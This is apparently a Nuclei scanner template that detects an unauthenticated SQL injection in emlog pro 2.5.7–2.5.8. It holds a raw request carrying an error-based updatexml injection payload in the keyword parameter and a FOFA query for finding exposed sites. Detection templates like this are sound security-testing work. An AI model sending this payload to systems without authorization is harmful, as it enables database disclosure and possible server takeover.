http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 'XPATH syntax error:'
            - ~4297f44b13955235245b2497399d7a9
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /index.php?keyword=%2527%20AND%20updatexml(1,concat(0x7e,md5(123123),0x7e),1)%20%20--%2520 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
id: emlog-pro-2_5_7-2_5_8-sql
info:
    author: Superhero
    description: |-
        fofa: app="EMLOG"
        emlog pro-2.5.7-2.5.8 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: emlog pro-2.5.7-2.5.8 SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/zH2vlWSZPoUOgKwwi2XiZw
    severity: high
    tags:
        - emlog
        - EMLOG
        - Emlog
